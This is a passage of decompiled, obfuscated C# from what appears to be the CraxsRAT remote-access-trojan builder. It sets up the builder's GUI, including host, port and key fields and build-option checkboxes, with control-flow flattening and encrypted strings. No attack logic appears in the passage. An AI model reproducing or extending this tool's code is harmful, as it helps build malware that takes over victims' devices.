            num1 = (int) num3 * -139571568 ^ 583833371;
            continue;
          case 337:
            this.Label9.FlatStyle = FlatStyle.Flat;
            num1 = (int) num3 * -818499631 ^ -101862335;
            continue;
          case 338:
            this.DrakeUIButtonIcon4 = new DrakeUIButtonIcon();
            this.worklabel = new Label();
            num1 = (int) num3 * 745276673 ^ -1255884889;
            continue;
          case 339:
            this.logopic.Image = (Image) Craxs_Rat.My.Resources.Resources.sstore;
            this.logopic.Location = new Point(0, 0);
            num1 = (int) num3 * -292102564 ^ -1611842025;
            continue;
          case 340:
            gridViewCellStyle1.BackColor = Color.Black;
            gridViewCellStyle1.Font = new Font(EXGuarder.\u0034C5F3E79, 12f);
            gridViewCellStyle1.ForeColor = Color.White;
            num1 = (int) num3 * 1051677088 ^ -25196114;
            continue;
          case 341:
            this.DrakeUIButtonIcon4.Symbol = 61564;
            num1 = (int) num3 * 910476401 ^ -1768289908;
            continue;
          case 342:
            this.PictureBox1.Name = EXGuarder.\u003116F776E;
            this.PictureBox1.Size = new Size(593, 367);
            num1 = (int) num3 * -1902486370 ^ 1667183873;
            continue;
          case 343:
            this.DrakeUIButtonIcon2.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * 1990644136 ^ 1634725728;
            continue;
          case 344:
            this.DrakeUIButtonIcon3.Size = new Size(45, 42);
            num1 = (int) num3 * 419351974 ^ 2066633577;
            continue;
          case 345:
            this.b_ok.ForePressColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.b_ok.Location = new Point(729, 575);
            num1 = (int) num3 * 629303104 ^ -628719389;
            continue;
          case 346:
            this.Label16.Name = EXGuarder.\u003500C3A01;
            num1 = (int) num3 * 1560402610 ^ -1755112480;
            continue;
          case 347:
            this.DrakeUITabControl1.TabBackColor = Color.Black;
            num1 = (int) num3 * 32901428 ^ -1163565984;
            continue;
          case 348:
            this.workimage.Font = new Font(EXGuarder.\u0034C5F3E79, 12f);
            this.workimage.Location = new Point(121, 35);
            num1 = (int) num3 * 326991101 ^ -16889049;
            continue;
          case 349:
            gridViewCellStyle4.SelectionBackColor = Color.White;
            gridViewCellStyle4.SelectionForeColor = Color.Black;
            num1 = (int) num3 * -906972470 ^ 1509743798;
            continue;
          case 350:
            gridViewCellStyle4.ForeColor = Color.White;
            num1 = (int) num3 * -445930103 ^ -1591745787;
            continue;
          case 351:
            this.DrakeUIButtonIcon2.Size = new Size(45, 42);
            this.DrakeUIButtonIcon2.Style = UIStyle.Custom;
            num1 = (int) num3 * 441961018 ^ 1918268649;
            continue;
          case 352:
            this.Label8.Location = new Point(169, 460);
            num1 = (int) num3 * -1604154852 ^ 1381786566;
            continue;
          case 353:
            this.workimage.Cursor = Cursors.Default;
            num1 = (int) num3 * -919062941 ^ -737476179;
            continue;
          case 354:
            gridViewCellStyle1.Alignment = DataGridViewContentAlignment.MiddleLeft;
            num1 = (int) num3 * -1295709935 ^ -1725672140;
            continue;
          case 355:
            this.showworkbtn.FillColor = Color.FromArgb(10, 10, 10);
            num1 = (int) num3 * -1796384300 ^ -900583028;
            continue;
          case 356:
            this.DrakeUIButtonIcon5.Font = new Font(EXGuarder.\u0034C5F3E79, 12f);
            num1 = (int) num3 * 349605244 ^ -685763554;
            continue;
          case 357:
            this.Label14.Font = new Font(EXGuarder.\u0034C5F3E79, 13f);
            num1 = (int) num3 * -1259919546 ^ -1205902764;
            continue;
          case 358:
            this.reqbtn.RectColor = Color.FromArgb(14, 110, 178);
            num1 = (int) num3 * -350643487 ^ 1387249724;
            continue;
          case 359:
            this.checksuper.Size = new Size(61, 29);
            num1 = (int) num3 * -1909148614 ^ 1336659464;
            continue;
          case 360:
            this.storebtn.FillColor = Color.Black;
            this.storebtn.FillDisableColor = Color.FromArgb(20, 20, 20);
            num1 = (int) num3 * 397480750 ^ 1606347092;
            continue;
          case 361:
            this.Label3.Name = EXGuarder.\u003000C2824;
            num1 = (int) num3 * 1910455678 ^ 300549944;
            continue;
          case 362:
            this.iconprim.FillWeight = 65f;
            num1 = (int) num3 * -1244561611 ^ -226015864;
            continue;
          case 363:
            this.Label7.Location = new Point(95, 84);
            this.Label7.Name = EXGuarder.\u00360275376;
            num1 = (int) num3 * 1905096538 ^ 1261025519;
            continue;
          case 364:
            this.DrakeUIButtonIcon12.RectSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIButtonIcon12.Size = new Size(45, 42);
            num1 = (int) num3 * 11037000 ^ 1711034926;
            continue;
          case 365:
            this.TabPage2.SuspendLayout();
            ((ISupportInitialize) this.DGVSTORE).BeginInit();
            num1 = (int) num3 * 1669455530 ^ 1667107828;
            continue;
          case 366:
            this.worklog.Location = new Point(0, 146);
            this.worklog.Margin = new Padding(5, 6, 5, 6);
            num1 = (int) num3 * -476522964 ^ -1925954799;
            continue;
          case 367:
            this.storebtn.ForeColor = Color.FromArgb(42, (int) sbyte.MaxValue, 42);
            this.storebtn.Location = new Point(66, 564);
            this.storebtn.Name = EXGuarder.\u003056D0450;
            num1 = (int) num3 * -259505565 ^ -989012576;
            continue;
          case 368:
            this.DrakeUIButtonIcon4.Font = new Font(EXGuarder.\u0034C5F3E79, 9f);
            num1 = (int) num3 * -58929728 ^ -772548662;
            continue;
          case 369:
            this.Label4.Location = new Point(690, 84);
            num1 = (int) num3 * -264896717 ^ 1656529500;
            continue;
          case 370:
            this.lockpanel.Controls.Add((Control) this.DrakeUIButtonIcon3);
            this.lockpanel.Controls.Add((Control) this.PictureBox1);
            num1 = (int) num3 * 206036753 ^ -1972324085;
            continue;
          case 371:
            this.PictureBox1.TabIndex = 1;
            num1 = (int) num3 * -222563903 ^ -868862578;
            continue;
          case 372:
            this.TheKey.Minimum = (double) int.MinValue;
            num1 = (int) num3 * -895848386 ^ -1134978836;
            continue;
          case 373:
            this.primname = new DataGridViewTextBoxColumn();
            num1 = (int) num3 * -570994717 ^ -1823429091;
            continue;
          case 374:
            this.DGVSTORE.RowsDefaultCellStyle = gridViewCellStyle4;
            this.DGVSTORE.RowTemplate.Height = 24;
            this.DGVSTORE.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
            num1 = (int) num3 * -627904715 ^ 2097524343;
            continue;
          case 375:
            gridViewCellStyle5.ForeColor = Color.White;
            gridViewCellStyle5.SelectionBackColor = Color.White;
            gridViewCellStyle5.SelectionForeColor = Color.Black;
            num1 = (int) num3 * 918701367 ^ -1762649035;
            continue;
          case 376:
            this.Controls.Add((Control) this.lockpanel);
            this.Controls.Add((Control) this.mainpanel);
            num1 = (int) num3 * -952586854 ^ 1938054159;
            continue;
          case 377:
            this.Label6.Text = EXGuarder.\u003710F2348;
            num1 = (int) num3 * 1974805383 ^ 2116224012;
            continue;
          case 378:
            this.showworkbtn.TabIndex = 10;
            this.showworkbtn.Text = EXGuarder.\u0033A355B16;
            num1 = (int) num3 * 1620532279 ^ 1367201072;
            continue;
          case 379:
            this.Label13.TextAlign = ContentAlignment.MiddleCenter;
            num1 = (int) num3 * -1030777630 ^ 718140424;
            continue;
          case 380:
            this.DGVSTORE.Location = new Point(0, 0);
            this.DGVSTORE.MultiSelect = false;
            this.DGVSTORE.Name = EXGuarder.\u0036C524C50;
            this.DGVSTORE.ReadOnly = true;
            num1 = (int) num3 * 737305631 ^ 213500372;
            continue;
          case 381:
            this.Label12.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -1677671332 ^ 546948638;
            continue;
          case 382:
            this.Port.TabIndex = 28;
            num1 = (int) num3 * -590247631 ^ 1949318429;
            continue;
          case 383:
            this.Label14.Name = EXGuarder.\u0031E706F18;
            num1 = (int) num3 * -443495932 ^ -847429444;
            continue;
          case 384:
            this.exitbtn.Name = EXGuarder.\u003013D3406;
            num1 = (int) num3 * -1082708741 ^ 23753389;
            continue;
          case 385:
            this.msgtext.StyleCustomMode = true;
            this.msgtext.TabIndex = 40;
            this.msgtext.TextAlignment = ContentAlignment.TopCenter;
            num1 = (int) num3 * -1525419316 ^ -803502860;
            continue;
          case 386:
            this.Status.Name = EXGuarder.\u00356165B0C;
            num1 = (int) num3 * -1690493945 ^ -594849963;
            continue;
          case 387:
            this.Label13.Size = new Size(591, 23);
            this.Label13.TabIndex = 2;
            num1 = (int) num3 * -1691139367 ^ 29612716;
            continue;
          case 388:
            this.Label8.TextAlign = ContentAlignment.MiddleLeft;
            num1 = (int) num3 * 892509658 ^ 649600656;
            continue;
          case 389:
            this.b_ok.Margin = new Padding(4);
            num1 = (int) num3 * -611373198 ^ 1461968482;
            continue;
          case 390:
            this.DrakeUIButtonIcon3.StyleCustomMode = true;
            num1 = (int) num3 * 1714432529 ^ -27561291;
            continue;
          case 391:
            this.DrakeUIButtonIcon5.Cursor = Cursors.Hand;
            num1 = (int) num3 * 525732767 ^ 1430133405;
            continue;
          case 392:
            this.SuspendLayout();
            num1 = (int) num3 * -306083004 ^ 851072708;
            continue;
          case 393:
            this.ImageList1.ImageStream = (ImageListStreamer) componentResourceManager.GetObject(EXGuarder.\u0030526392C);
            num1 = (int) num3 * 1847849007 ^ -935415131;
            continue;
          case 394:
            this.reqbtn.Style = UIStyle.Custom;
            num1 = (int) num3 * 73024861 ^ 1130727432;
            continue;
          case 395:
            this.TabPage1 = new TabPage();
            this.checkkill = new DrakeUICheckBox();
            num1 = (int) num3 * 1577853666 ^ -727214800;
            continue;
          case 396:
            this.Panel1.Name = EXGuarder.\u0036A346E64;
            num1 = (int) num3 * -827436877 ^ -2032499953;
            continue;
          case 397:
            this.Label7.Font = new Font(EXGuarder.\u0033E1A7215, 14f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            this.Label7.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1010237842 ^ 101693999;
            continue;
          case 398:
            this.msgtext.Radius = 15;
            this.msgtext.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.msgtext.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * -1533758040 ^ -2066286044;
            continue;
          case 399:
            this.DrakeUIButtonIcon4.Size = new Size(45, 42);
            this.DrakeUIButtonIcon4.Style = UIStyle.Custom;
            num1 = (int) num3 * -1558374271 ^ -896440183;
            continue;
          case 400:
            this.exitbtn.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.exitbtn.Location = new Point(819, 564);
            num1 = (int) num3 * -239392860 ^ -565502334;
            continue;
          case 401:
            this.ComboPrims.Name = EXGuarder.\u0036D1E5B36;
            num1 = (int) num3 * -518627247 ^ 1465213896;
            continue;
          case 402:
            this.CLiname.Location = new Point(35, 118);
            num1 = (int) num3 * 1903258659 ^ -1562441215;
            continue;
          case 403:
            this.Port.Padding = new Padding(5);
            this.Port.Radius = 15;
            this.Port.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -94447861 ^ -1353239564;
            continue;
          case 404:
            this.checkDraw.Location = new Point(83, 460);
            this.checkDraw.Name = EXGuarder.\u00313351008;
            this.checkDraw.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num3 * 500014913 ^ -1261886255;
            continue;
          case 405:
            this.Port.Cursor = Cursors.IBeam;
            this.Port.FillColor = Color.Black;
            num1 = (int) num3 * -1573676792 ^ 1909650991;
            continue;
          case 406:
            this.sel.Name = EXGuarder.\u003123E1A02;
            num1 = (int) num3 * 283907273 ^ -612873587;
            continue;
          case 407:
            gridViewCellStyle2.SelectionForeColor = Color.Black;
            num1 = (int) num3 * 659085533 ^ 1337982800;
            continue;
          case 408:
            this.DrakeUIButtonIcon4.Location = new Point(68, 46);
            num1 = (int) num3 * 2135251024 ^ -394241700;
            continue;
          case 409:
            this.Label12.Name = EXGuarder.\u0033242140A;
            num1 = (int) num3 * 89322267 ^ 455875819;
            continue;
          case 410:
            this.DGVSTORE.Dock = DockStyle.Fill;
            num1 = (int) num3 * 538858978 ^ -1907802504;
            continue;
          case 411:
            this.workpanel.Controls.Add((Control) this.DrakeUIButtonIcon2);
            this.workpanel.Controls.Add((Control) this.DrakeUIButtonIcon4);
            num1 = (int) num3 * -1857929336 ^ 1500737375;
            continue;
          case 412:
            this.Label5.Name = EXGuarder.\u0033A2E4138;
            num1 = (int) num3 * 280024699 ^ 849010452;
            continue;
          case 413:
            ((ISupportInitialize) this.workimage).EndInit();
            num1 = (int) num3 * -426729647 ^ -955500858;
            continue;
          case 414:
            this.DrakeUIButtonIcon13.TabIndex = 34;
            num1 = (int) num3 * -294868909 ^ -915812024;
            continue;
          case 415:
            this.DrakeUIButtonIcon4.SymbolSize = 25;
            this.DrakeUIButtonIcon4.TabIndex = 42;
            num1 = (int) num3 * 111546509 ^ -898538639;
            continue;
          case 416:
            this.downprogress.RectColor = Color.FromArgb(230, 80, 80);
            this.downprogress.Size = new Size(1184, 23);
            this.downprogress.Style = UIStyle.Red;
            this.downprogress.StyleCustomMode = true;
            num1 = (int) num3 * 1352438604 ^ 2129619833;
            continue;
          case 417:
            this.StartPosition = FormStartPosition.CenterScreen;
            this.Text = EXGuarder.\u00360215040;
            num1 = (int) num3 * -1199580178 ^ 2095766679;
            continue;
          case 418:
            gridViewCellStyle1 = new DataGridViewCellStyle();
            gridViewCellStyle2 = new DataGridViewCellStyle();
            num1 = (int) num3 * 206087321 ^ -582182931;
            continue;
          case 419:
            this.storebtn.RectColor = Color.FromArgb(42, (int) sbyte.MaxValue, 42);
            this.storebtn.RectDisableColor = Color.FromArgb(20, 20, 20);
            num1 = (int) num3 * 826772979 ^ -2141688381;
            continue;
          case 420:
            this.DrakeUIButtonIcon12 = new DrakeUIButtonIcon();
            num1 = (int) num3 * -396111392 ^ -168164138;
            continue;
          case 421:
            this.Label8 = new Label();
            this.Label6 = new Label();
            num1 = (int) num3 * -1509778560 ^ 1792532627;
            continue;
          case 422:
            this.logopic.Dock = DockStyle.Top;
            num1 = (int) num3 * 999527395 ^ -686122673;
            continue;
          case 423:
            this.Label5.Font = new Font(EXGuarder.\u003214C7825, 18f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num3 * 1138905580 ^ 114980450;
            continue;
          case 424:
            this.iconprim.HeaderText = EXGuarder.\u0036A3E4652;
            this.iconprim.Name = EXGuarder.\u0035B352051;
            num1 = (int) num3 * -1855853257 ^ -1161237284;
            continue;
          case 425:
            this.DrakeUIImageButton1.Image = (Image) componentResourceManager.GetObject(EXGuarder.\u003702F3A35);
            num1 = (int) num3 * -779859580 ^ 186774880;
            continue;
          case 426:
            this.checkautoclick.Font = new Font(EXGuarder.\u0034C5F3E79, 12f);
            this.checkautoclick.Location = new Point(83, 377);
            this.checkautoclick.Name = EXGuarder.\u00362105208;
            num1 = (int) num3 * -1362400600 ^ 1156566380;
            continue;
          case 427:
            this.DrakeUIImageButton1.TabIndex = 36;
            num1 = (int) num3 * -1740301489 ^ 1328511389;
            continue;
          case 428:
            this.exitbtn = new DrakeUIButtonIcon();
            this.reqbtn = new DrakeUIButtonIcon();
            num1 = (int) num3 * 1408754567 ^ -2035943594;
            continue;
          case 429:
            this.Host.TextAlignment = ContentAlignment.TopCenter;
            num1 = (int) num3 * -96331336 ^ 1736495034;
            continue;
          case 430:
            gridViewCellStyle2.ForeColor = Color.White;
            num1 = (int) num3 * 291037975 ^ -1326632028;
            continue;
          case 431:
            this.DrakeUIButtonIcon13.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * 1212421133 ^ 1897783337;
            continue;
          case 432:
            this.Label9.AutoSize = true;
            this.Label9.Cursor = Cursors.Default;
            num1 = (int) num3 * -2083831599 ^ 1215475183;
            continue;
          case 433:
            this.titletext.Margin = new Padding(4, 5, 4, 5);
            num1 = (int) num3 * -869836761 ^ -1729460992;
            continue;
          case 434:
            this.Label5.Size = new Size(263, 34);
            num1 = (int) num3 * -2105079165 ^ 1370257719;
            continue;
          case 435:
            this.TabPage2.BackColor = Color.Black;
            this.TabPage2.Controls.Add((Control) this.showworkbtn);
            num1 = (int) num3 * 1274870941 ^ 1100225891;
            continue;
          case 436:
            this.loadworker = new BackgroundWorker();
            num1 = (int) num3 * 651579329 ^ -1743809098;
            continue;
          case 437:
            this.DrakeUIButtonIcon13.Style = UIStyle.Custom;
            this.DrakeUIButtonIcon13.StyleCustomMode = true;
            this.DrakeUIButtonIcon13.Symbol = 62161;
            this.DrakeUIButtonIcon13.SymbolSize = 25;
            num1 = (int) num3 * 804770299 ^ -865381285;
            continue;
          case 438:
            this.Status.HeaderText = EXGuarder.\u00328273A6A;
            num1 = (int) num3 * -1742538372 ^ -510468584;
            continue;
          case 439:
            this.exitbtn.Font = new Font(EXGuarder.\u0034C5F3E79, 19f);
            num1 = (int) num3 * 770557966 ^ 1206761904;
            continue;
          case 440:
            this.DrakeUIImageButton1.SizeMode = PictureBoxSizeMode.StretchImage;
            num1 = (int) num3 * -2020125130 ^ -1459003435;
            continue;
          case 441:
            this.strpasstext = new DrakeUITextBox();
            num1 = (int) num3 * -179248500 ^ -257105358;
            continue;
          case 442:
            this.DrakeUIImageButton1.TabStop = false;
            num1 = (int) num3 * 1920643378 ^ -1135772788;
            continue;
          case 443:
            this.titletext.Style = UIStyle.Custom;
            this.titletext.StyleCustomMode = true;
            this.titletext.TabIndex = 38;
            num1 = (int) num3 * 101301748 ^ 681459701;
            continue;
          case 444:
            this.Host.TabIndex = 30;
            num1 = (int) num3 * -2107308354 ^ 545539955;
            continue;
          case 445:
            this.ComboPrims.ForeColor = Color.White;
            this.ComboPrims.FormattingEnabled = true;
            this.ComboPrims.Items.AddRange(new object[2]
            {
              (object) EXGuarder.\u00302425D47,
              (object) EXGuarder.\u0033966356B
            });
            num1 = (int) num3 * 527984227 ^ 673680735;
            continue;
          case 446:
            this.DGVSTORE.ColumnHeadersVisible = false;
            this.DGVSTORE.Columns.AddRange((DataGridViewColumn) this.iconprim, (DataGridViewColumn) this.primname, (DataGridViewColumn) this.sizeapp, (DataGridViewColumn) this.verapp, (DataGridViewColumn) this.Status, (DataGridViewColumn) this.apdate, (DataGridViewColumn) this.sel);
            num1 = (int) num3 * 1934587734 ^ 1724243396;
            continue;
          case 447:
            this.ComboPrims.Size = new Size(163, 33);
            num1 = (int) num3 * 1116267518 ^ 795309815;
            continue;
          case 448:
            this.TabPage1.Controls.Add((Control) this.DrakeUIAvatar5);
            num1 = (int) num3 * -1586263553 ^ 619451581;
            continue;
          case 449:
            this.AutoScaleMode = AutoScaleMode.Font;
            num1 = (int) num3 * 861746280 ^ -863738748;
            continue;
          case 450:
            this.DrakeUIButtonIcon1.Name = EXGuarder.\u003672A0A50;
            num1 = (int) num3 * 106740158 ^ 182049412;
            continue;
          case 451:
            this.b_ok.Size = new Size(321, 121);
            num1 = (int) num3 * 201521510 ^ -949820733;
            continue;
          case 452:
            this.apdate.Name = EXGuarder.\u0031E2B741D;
            num1 = (int) num3 * 1058308858 ^ 1170225210;
            continue;
          case 453:
            this.TheKey.Style = UIStyle.Custom;
            this.TheKey.StyleCustomMode = true;
            num1 = (int) num3 * 694643444 ^ -1558819085;
            continue;
          case 454:
            this.DrakeUIAvatar5.AvatarSize = 25;
            this.DrakeUIAvatar5.BackColor = Color.Transparent;
            num1 = (int) num3 * -1254364740 ^ 1849197335;
            continue;
          case 455:
            this.Label5.TabIndex = 37;
            this.Label5.Tag = (object) EXGuarder.\u00311734B49;
            this.Label5.Text = EXGuarder.\u003140B656D;
            this.Label5.TextAlign = ContentAlignment.MiddleLeft;
            num1 = (int) num3 * 607950936 ^ 1257366316;
            continue;
          case 456:
            this.Host.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.Host.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * 1804884965 ^ 1362535892;
            continue;
          case 457:
            this.DrakeUITabControl1.Font = new Font(EXGuarder.\u0034C5F3E79, 12f);
            num1 = (int) num3 * 1991006007 ^ -1657338042;
            continue;
          case 458:
            this.Label15.Size = new Size(591, 238);
            this.Label15.TabIndex = 3;
            num1 = (int) num3 * 2032105395 ^ 1674358577;
            continue;
          case 459:
            this.CLiname.Padding = new Padding(5);
            num1 = (int) num3 * 1240106323 ^ -1029240099;
            continue;
          case 460:
            this.strpasstext.Maximum = (double) int.MaxValue;
            this.strpasstext.Minimum = (double) int.MinValue;
            this.strpasstext.Name = EXGuarder.\u00328674B6A;
            num1 = (int) num3 * 191109238 ^ 696874401;
            continue;
          case 461:
            this.FormBorderStyle = FormBorderStyle.None;
            this.MaximumSize = new Size(1184, 803);
            num1 = (int) num3 * 473756758 ^ -1296806709;
            continue;
          case 462:
            this.showworkbtn.Size = new Size(25, 23);
            this.showworkbtn.Style = UIStyle.Custom;
            num1 = (int) num3 * -509679140 ^ 1911467715;
            continue;
          case 463:
            this.worklog.Maximum = (double) int.MaxValue;
            num1 = (int) num3 * -110687676 ^ 1186962363;
            continue;
          case 464:
            this.ToolTips.SetToolTip((Control) this.DrakeUIButtonIcon13, EXGuarder.\u0030D66215D);
            this.DrakeUIButtonIcon12.Cursor = Cursors.Hand;
            this.DrakeUIButtonIcon12.FillColor = Color.Black;
            num1 = (int) num3 * 1603159340 ^ -1261414330;
            continue;
          case 465:
            this.b_ok.Font = new Font(EXGuarder.\u0034C5F3E79, 12f);
            num1 = (int) num3 * 1111630838 ^ 1586013471;
            continue;
          case 466:
            this.b_ok.FillColor = Color.FromArgb((int) sbyte.MaxValue, 5, 1);
            this.b_ok.FillHoverColor = Color.FromArgb(20, 20, 20);
            this.b_ok.FillPressColor = Color.Black;
            num1 = (int) num3 * -1623108787 ^ 1043202383;
            continue;
          case 467:
            this.DrakeUITabControl1.DrawMode = TabDrawMode.OwnerDrawFixed;
            num1 = (int) num3 * -918132009 ^ 893703883;
            continue;
          case 468:
            this.b_ok.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * -1509716959 ^ -1005147598;
            continue;
          case 469:
            this.DGVSTORE = new DataGridView();
            this.iconprim = new DataGridViewImageColumn();
            num1 = (int) num3 * 1114793768 ^ -270287045;
            continue;
          case 470:
            this.TheKey.TextAlignment = ContentAlignment.TopCenter;
            num1 = (int) num3 * 1569111622 ^ 1753878359;
            continue;
          case 471:
            this.CLiname.ForeColor = Color.White;
            num1 = (int) num3 * 1121517222 ^ -553159126;
            continue;
          case 472:
            this.Panelhome.Size = new Size(1184, 780);
            this.Panelhome.TabIndex = 2;
            this.exitbtn.Cursor = Cursors.Hand;
            this.exitbtn.Enabled = false;
            num1 = (int) num3 * 2054941485 ^ -241653827;
            continue;
          case 473:
            this.Panel3.ResumeLayout(false);
            num1 = (int) num3 * -1941678343 ^ 667260374;
            continue;
          case 474:
            this.Controls.Add((Control) this.statustext);
            num1 = (int) num3 * -587569882 ^ 1008914407;
            continue;
          case 475:
            this.Host.Name = EXGuarder.\u00342614450;
            num1 = (int) num3 * -35255198 ^ -1153549111;
            continue;
          case 476:
            this.mainpanel.SuspendLayout();
            this.DrakeUITabControl1.SuspendLayout();
            num1 = (int) num3 * 1707594629 ^ -42113065;
            continue;
          case 477:
            this.DrakeUIButtonIcon3 = new DrakeUIButtonIcon();
            num1 = (int) num3 * 413581104 ^ 449353243;
            continue;
          case 478:
            this.Label12.AutoSize = true;
            num1 = (int) num3 * -1447364139 ^ 1151982928;
            continue;
          case 479:
            this.DrakeUITabControl1.ItemSize = new Size(388, 40);
            num1 = (int) num3 * 1048444142 ^ 1816940885;
            continue;
          case 480:
            this.Panelhome = new Panel();
            num1 = (int) num3 * 1527454641 ^ -874315106;
            continue;
          case 481:
            this.DrakeUIButtonIcon3.TabIndex = 34;
            num1 = (int) num3 * -1142462209 ^ -88728195;
            continue;
          case 482:
            gridViewCellStyle2.Alignment = DataGridViewContentAlignment.MiddleLeft;
            num1 = (int) num3 * -1278170370 ^ 1857097245;
            continue;
          case 483:
            this.Label4.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1898708113 ^ -1567598132;
            continue;
          case 484:
            this.Label8.Margin = new Padding(4, 0, 4, 0);
            this.Label8.Name = EXGuarder.\u00356304C38;
            num1 = (int) num3 * -1239326265 ^ 966371941;
            continue;
          case 485:
            this.TabPage1.Controls.Add((Control) this.Port);
            num1 = (int) num3 * 2038034605 ^ 795329175;
            continue;
          case 486:
            this.storebtn.Font = new Font(EXGuarder.\u0034C5F3E79, 19f);
            num1 = (int) num3 * -1766191024 ^ -1220563239;
            continue;
          case 487:
            this.Label4.Text = EXGuarder.\u0034344070F;
            num1 = (int) num3 * -380343819 ^ -216365019;
            continue;
          case 488:
            this.TabPage2.ResumeLayout(false);
            num1 = (int) num3 * -134031424 ^ -1199663961;
            continue;
          case 489:
            this.DrakeUIButtonIcon12.TabIndex = 33;
            num1 = (int) num3 * 639194476 ^ -68886120;
            continue;
          case 490:
            this.showworkbtn.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            this.showworkbtn.AvatarSize = 45;
            num1 = (int) num3 * 1393492586 ^ 959432410;
            continue;
          case 491:
            this.b_ok.FillSelectedColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1195935315 ^ -773391602;
            continue;
          case 492:
            this.showworkbtn.BackColor = Color.Transparent;
            num1 = (int) num3 * 1992160703 ^ -345990407;
            continue;
          case 493:
            this.DrakeUIButtonIcon1.FillColor = Color.Black;
            num1 = (int) num3 * 454912716 ^ 962100251;
            continue;
          case 494:
            this.checksuper.CheckBoxColor = Color.FromArgb(30, 136, 229);
            this.checksuper.Cursor = Cursors.Hand;
            this.checksuper.Font = new Font(EXGuarder.\u0034C5F3E79, 12f);
            num1 = (int) num3 * -753209731 ^ -940916506;
            continue;
          case 495:
            this.DrakeUITabControl1.Controls.Add((Control) this.TabPage2);
            num1 = (int) num3 * 2062890442 ^ -625170772;
            continue;
          case 496:
            this.Label9.Location = new Point(169, 548);
            num1 = (int) num3 * 827392944 ^ 828850306;
            continue;
          case 497:
            this.Label1.Dock = DockStyle.Left;
            num1 = (int) num3 * 725182946 ^ -1709280189;
            continue;
          case 498:
            this.DrakeUIButtonIcon2 = new DrakeUIButtonIcon();
            num1 = (int) num3 * 1376648176 ^ 1833508480;
            continue;
          case 499:
            this.Label17.Size = new Size(591, 129);
            num1 = (int) num3 * 1808871473 ^ 907325151;
            continue;
          case 500:
            this.TabPage1.Controls.Add((Control) this.Host);
            num1 = (int) num3 * -1236299014 ^ 1629419274;
            continue;
          case 501:
            gridViewCellStyle1.WrapMode = DataGridViewTriState.False;
            num1 = (int) num3 * -1256000076 ^ 214901386;
            continue;
          case 502:
            this.storebtn.Style = UIStyle.Custom;
            this.storebtn.Symbol = 61819;
            this.storebtn.TabIndex = 1;
            this.storebtn.Text = EXGuarder.\u0032A383E75;
            num1 = (int) num3 * 1513146601 ^ -1515614242;
            continue;
          case 503:
            this.worklog.Style = UIStyle.Custom;
            num1 = (int) num3 * -824171719 ^ -938753886;
            continue;
          case 504:
            this.DrakeUIButtonIcon13.RectHoverColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1252094916 ^ 1506505137;
            continue;
          case 505:
            this.TabPage2.Size = new Size(1184, 684);
            this.TabPage2.TabIndex = 1;
            num1 = (int) num3 * 1262304245 ^ -519044462;
            continue;
          case 506:
            this.DrakeUIImageButton1.Text = (string) null;
            this.DrakeUIButtonIcon13.Cursor = Cursors.Hand;
            num1 = (int) num3 * -128587336 ^ -645861310;
            continue;
          case 507:
            this.worklog = new DrakeUITextBox();
            num1 = (int) num3 * -880980356 ^ -483795675;
            continue;
          case 508:
            this.reqbtn.Cursor = Cursors.Hand;
            num1 = (int) num3 * 1794178921 ^ 1816601805;
            continue;
          case 509:
            this.worklog.Size = new Size(1184, 515);
            num1 = (int) num3 * 157604949 ^ 418189808;
            continue;
          case 510:
            this.TabPage1.Name = EXGuarder.\u003144C3412;
            this.TabPage1.Size = new Size(1184, 684);
            this.TabPage1.TabIndex = 0;
            num1 = (int) num3 * 1802525618 ^ -2146300210;
            continue;
          case 511:
            this.Label14.TabIndex = 48;
            this.Label14.Text = EXGuarder.\u003442C5F72;
            num1 = (int) num3 * -2090524482 ^ 1618971061;
            continue;
          case 512:
            this.TheKey.Cursor = Cursors.IBeam;
            num1 = (int) num3 * 1822092462 ^ 1410728500;
            continue;
          case 513:
            this.DGVSTORE.AllowUserToAddRows = false;
            num1 = (int) num3 * 314039114 ^ 1160891234;
            continue;
          case 514:
            this.msgtext.Margin = new Padding(4, 5, 4, 5);
            num1 = (int) num3 * 142237975 ^ 1758590353;
            continue;
          case 515:
            this.DGVSTORE.ShowEditingIcon = false;
            this.DGVSTORE.ShowRowErrors = false;
            num1 = (int) num3 * -952569900 ^ -131772606;
            continue;
          case 516:
            this.titletext.Radius = 15;
            this.titletext.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -1894789687 ^ 2075833791;
            continue;
          case 517:
            this.DrakeUIButtonIcon13.Name = EXGuarder.\u0034C5B522F;
            num1 = (int) num3 * -2056103969 ^ -131120293;
            continue;
          case 518:
            this.DGVSTORE.AlternatingRowsDefaultCellStyle = gridViewCellStyle5;
            num1 = (int) num3 * -1323363404 ^ -1457918769;
            continue;
          case 519:
            this.TabPage4.Controls.Add((Control) this.workpanel);
            this.TabPage4.Location = new Point(0, 40);
            this.TabPage4.Name = EXGuarder.\u0037739210C;
            this.TabPage4.Size = new Size(1184, 684);
            num1 = (int) num3 * -77680944 ^ 2087932780;
            continue;
          case 520:
            this.Label17.Location = new Point(0, 238);
            num1 = (int) num3 * -1147937419 ^ -350328207;
            continue;
          case 521:
